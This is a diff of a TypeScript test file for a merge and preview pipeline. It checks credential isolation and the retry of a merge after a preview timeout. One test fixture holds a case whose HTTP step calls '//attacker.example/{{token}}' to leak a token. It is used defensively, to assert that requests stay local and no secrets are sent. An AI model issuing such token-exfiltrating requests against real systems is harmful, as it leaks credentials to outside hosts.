@@ -5,16 +5,18 @@ import { execFileSync } from 'node:child_process';
 import { existsSync } from 'node:fs';
 import { mkdir, readdir, realpath, rm, writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
-import { mergeOne, type MergePorts, type MergeRecordEvent, type MergeTrialRun } from '../src/merge-writer/executor.js';
+import { mergeOne, mergeRecordKey, mergeRecordKinds, type MergePorts, type MergeRecordEvent, type MergeTrialRun } from '../src/merge-writer/executor.js';
 import { previewCheckoutPrefix, previewConcurrency, previewFailureReason, previewSkip, previewSlots, runPreview, sweepPreviewCheckouts, type PreviewSite, type PreviewVerdict } from '../src/merge-writer/preview.js';
 import { mergeWriterReads } from '../src/daemon/cycle-merge-writer.js';
 import { foldMergeLedger, mergeLedgerKinds, mergeTrialKind } from '../src/model/merge-ledger.js';
-import { mergeRecordBodySchema } from '../src/server/merge-record.js';
+import { mergeRecordBodySchema, mergeRecordFingerprint } from '../src/server/merge-record.js';
 import { trialFailedGround, trialFailurePrefix } from '../src/model/rework-ground.js';
 import { masterConfigSchema } from '../src/master.js';
 import { tempOwnerMarker, writeTempOwner } from '../src/tmp-reclaim.js';
 import type { Work } from '../src/model.js';
 import type { StaticBuildShell } from '../src/release-project.js';
+import { loadCases } from '../src/e2e/case.js';
+import { runCases } from '../src/e2e/runner.js';
 import { temporaryDirectory } from './helpers/temp-dirs.js';
 
 // GY-1718: a passing trial merge of a static-site repository is built, served and run against its
@@ -221,7 +223,9 @@ test('unit:preview-capped-and-cleaned-up — at most two previews run at once; e
 test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs with the host basics only, its cases with a throwaway token whose requests stay on the served origin, and a cancelled preview kills its command steps\' processes', { timeout: 60_000 }, async () => {
   // The build: a candidate's build script sees PATH and HOME, never the coordinator's credentials.
   const fixture = await repository('preview-isolated', 42, [{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
-    steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] }]);
+    steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] },
+  { id: 'needs-secret', title: 'A case declaring an install secret', tags: ['api'], target: 'uat', required: true, secrets: ['API_KEY'],
+    steps: [{ kind: 'http', method: 'GET', path: '/{{secret:API_KEY}}', status: 200 }] }]);
   const host = { PATH: process.env.PATH, HOME: '/home/builder', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
   let buildEnvironment: NodeJS.ProcessEnv | undefined;
   const recordingShell: StaticBuildShell = async (command, cwd, _signal, env) => { buildEnvironment = env; return copySite(command, cwd); };
@@ -237,6 +241,15 @@ test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs w
   assert.ok(requested.length > 0 && requested.every(request => new URL(request.url).hostname === '127.0.0.1'), JSON.stringify(requested));
   assert.ok(requested.every(request => !/uat-secret|gh-secret|gy-secret/.test(request.authorization)), 'no coordinator token is sent');
   assert.ok(requested.some(request => /^Bearer preview-/.test(request.authorization)), 'the cases carry the preview\'s own token');
+  assert.ok(!verdict.cases.some(entry => entry.case === 'needs-secret'), 'a case declaring an install secret is not run on the preview');
+  // And a run that withholds secrets never hands one to a case, though the install's file holds it.
+  const secrets = await scratch('preview-secrets');
+  await writeFile(join(secrets, 'e2e-secrets.uat.env'), 'API_KEY=install-secret\n', { mode: 0o600 });
+  const withheld = await runCases(await loadCases(fixture.repo), { url: 'http://127.0.0.1:9', token: 'preview-token', root: fixture.repo, secretsDirectory: secrets, withholdSecrets: true, stepTimeoutMs: 1_000, fetcher: recordingFetcher });
+  const declared = withheld.cases.find(entry => entry.id === 'needs-secret')!;
+  assert.equal(declared.verdict, 'failed');
+  assert.match(declared.failingStep!.reason, /API_KEY is withheld/);
+  assert.ok(requested.every(request => !request.url.includes('install-secret')), 'no install secret reaches a request');
 
   // A command step in flight when the budget runs out: its process group is killed and the slot freed at once, not at the step's own ten-minute timeout.
   const marker = join(await scratch('preview-command'), 'still-running');
@@ -275,4 +288,42 @@ test('unit:preview-verdict-recorded — the preview verdict is recorded with the
   const { preview: _preview, ...plain } = payload as typeof payload & { preview?: unknown };
   const bare = foldMergeLedger([{ kind: mergeLedgerKinds.intent, payload: { key: 'GY-1', head, baseTip: tip, mergeSha, risk: 'normal', at: '2030-01-01T00:00:00Z' } }, { kind: mergeTrialKind, payload: plain }]);
   assert.equal('preview' in bare['GY-1']!.trial!, false);
+});
+
+test('unit:preview-timeout-retried — a head whose preview timed out is merged again by a later cycle on the same tip: the fresh trial commit is a new attempt under the coordinator\'s receipt rule, never a reused key, and it lands', async () => {
+  // The coordinator's merge-record route: each step under its key, replayed when the input matches, refused when it does not.
+  const receipts = new Map<string, string>(), stored: { kind: string; payload: Record<string, unknown>; work: string }[] = [];
+  const record: MergePorts['record'] = async (item, event) => {
+    const key = mergeRecordKey(item, event), fingerprint = mergeRecordFingerprint(item.id, mergeRecordBodySchema.parse(event));
+    const receipt = receipts.get(key);
+    if (receipt !== undefined) { assert.equal(receipt, fingerprint, `Idempotency key reused with different input: ${key}`); return {}; }
+    receipts.set(key, fingerprint);
+    const { kind, ...payload } = event;
+    stored.push({ kind: mergeRecordKinds[kind], payload: kind === 'refused' ? { ...payload, kind: 'merge' } : kind === 'intent' ? { ...payload, key: 'GY-1' } : payload, work: 'GY-1' });
+    return {};
+  };
+  let commits = 0, previews = 0, landed: string | null = null;
+  const verdictFor = (merged: string, result: PreviewVerdict['result']): PreviewVerdict => ({ result, mergeSha: merged, cases: [], failed: [], detail: result, durationMs: 5 });
+  const value: MergePorts = {
+    baseBranch: 'main', retrials: 1, now: () => Date.parse('2030-01-01T00:00:00Z') + commits * 60_000,
+    fetch: async () => landed ?? tip,
+    // commit-tree stamps the time, so each trial of the same head on the same tip is a fresh merge commit.
+    merge: async () => ({ mergeSha: sha(`merge-${++commits}`), files: ['src/game.ts'] }),
+    trial: async () => passingTrial,
+    preview: async merged => verdictFor(merged, ++previews === 1 ? 'timeout' : 'pass'),
+    push: async merged => { landed = merged; return 'pushed'; },
+    holds: async merged => merged === landed,
+    record,
+  };
+  const first = await mergeOne(value, work());
+  assert.equal(first.outcome, 'requeued', JSON.stringify(first));
+  const ledger = foldMergeLedger(stored)['GY-1']!;
+  assert.equal(ledger.state, 'refused');
+  // The next cycle reads the item with the ledger the timed-out attempt left.
+  const second = await mergeOne(value, { ...work(), mergeLedger: ledger });
+  assert.equal(second.outcome, 'merged', JSON.stringify(second));
+  assert.equal(landed, sha('merge-2'));
+  const intents = stored.filter(entry => entry.kind === mergeLedgerKinds.intent).map(entry => entry.payload.mergeSha);
+  assert.deepEqual(intents, [sha('merge-1'), sha('merge-2')], 'both attempts\' intents are recorded, each naming its own merge commit');
+  assert.equal(foldMergeLedger(stored)['GY-1']!.state, 'reconciled');
 });
